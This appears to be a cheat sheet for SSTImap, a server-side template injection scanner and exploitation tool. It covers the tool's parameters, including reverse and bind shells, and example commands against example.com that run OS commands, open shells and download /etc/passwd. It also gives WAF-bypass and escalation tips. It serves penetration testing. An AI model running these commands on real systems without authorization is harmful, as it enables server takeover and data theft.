# SSTImap

- **Category**: Web / Injection Testing
- **Risk Level**: 🔴 High

---

## Description

An automated Server-Side Template Injection (SSTI) detection and exploitation tool supporting Jinja2, Twig, Smarty, Pebble, Mako, Tornado, and other template engines. Similar to sqlmap but for SSTI vulnerabilities — automatically detects injection points, identifies the template engine, and can escalate to remote command execution or file read/write. SSTI vulnerabilities in Jinja2/Twig frequently lead to full server compromise.

## Installation

```bash
sudo apt install sstimap
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-u <url>` | Target URL (mark injection point with `*`, e.g., `?name=*`) |
| `-M`, `--marker <str>` | Use string as the injection marker (default `*`) |
| `-P`, `--injection-points <pts>` | Injection points to test without markers: Q(uery) B(ody) H(eaders) C(ookies). Default: QBHC |
| `-m`, `--method <method>` | HTTP method to use (default GET) |
| `-a`, `--user-agent <ua>` | User-Agent header value to use |
| `-A`, `--random-user-agent` | Random desktop-browser User-Agent on every request |
| `--delay <sec>` | Delay between requests (default/0: no delay) |
| `-c`, `--crawl <depth>` | Crawl depth (default/0: don't crawl) |
| `-f`, `--forms` | Scan page(s) for forms |
| `-r`, `--technique <RBET>` | Techniques: R(endered) E(rror-based) B(oolean blind) T(ime-based blind). Default: REBT |
| `-L`, `--force-level <LEVEL CLEVEL>` | Force a specific LEVEL and CLEVEL to test |
| `--blind-delay <sec>` | Delay to detect time-based blind injection (default 4 seconds) |
| `-d <data>` | Request body data param to send (e.g., `param=value`) [Stackable] |
| `-H <header>` | Header to send (e.g., `Header: Value`) [Stackable] |
| `-C`, `--cookie <cookie>` | Cookie to send (e.g., `Field=Value`) [Stackable] |
| `-e <engine>` | Comma-separated list of template engines to test |
| `-i` | Run SSTImap in interactive mode |
| `-t`, `--tpl-shell` | Prompt for an interactive shell on the template engine |
| `-T`, `--tpl-code <code>` | Inject code in the template engine |
| `-x`, `--eval-shell` | Prompt for an interactive shell on the template engine base language |
| `-X`, `--eval-code <code>` | Evaluate code in the template engine base language |
| `-s`, `--os-shell` | Prompt for an interactive operating system shell |
| `-S`, `--os-cmd <cmd>` | Execute an operating system command |
| `-B`, `--bind-shell <port>` | Spawn a system shell on a TCP port of the target |
| `-R`, `--reverse-shell <host> <port>` | Run a system shell and back-connect to local host/port |
| `-F`, `--force-overwrite` | Force file overwrite when uploading |
| `-U`, `--upload <local> <remote>` | Upload local to remote files |
| `-D`, `--download <remote> <local>` | Download remote to local files |
| `-l <level>` | Level of escaping to perform (1-5, default: 1) |
| `--proxy <url>` | Use a proxy to connect to the target URL |

## Common Commands

```bash
# Basic SSTI detection on a GET parameter
sstimap -u "http://example.com/search?name=*"

# POST data injection
sstimap -u "http://example.com/render" -d "template=*&user=admin"

# Execute OS command after detecting SSTI
sstimap -u "http://example.com/search?name=*" -S "id"

# Get an interactive shell
sstimap -u "http://example.com/search?name=*" -s

# Download a file from the server
sstimap -u "http://example.com/search?name=*" -D "/etc/passwd" "./passwd.txt"

# Force Jinja2 engine (skip detection)
sstimap -u "http://example.com/search?name=*" -e Jinja2

# With authentication cookie
sstimap -u "http://example.com/profile?name=*" --cookie "session=abc123"

# Route through Burp Suite proxy
sstimap -u "http://example.com/search?name=*" --proxy http://127.0.0.1:8080
```

## Notes & Tips

1. Mark the injection point with `*` in the URL or POST data — sstimap tests that position with template engine payloads.
2. Look for SSTI in any parameter that renders user input in responses: names, messages, email templates, report generation.
3. If the target uses a WAF, increase detection level (`-l 5`) for more bypass variants.
4. Manually confirm first with `{{7*7}}` — if the response shows `49`, SSTI is confirmed before running sstimap.
5. Jinja2 SSTI can achieve full RCE — escalate to `-s` (`--os-shell`) for interactive post-exploitation access.

---

## Official References

- [SSTImap (GitHub)](https://github.com/vladko312/SSTImap)
- [Kali sstimap](https://www.kali.org/tools/sstimap/)
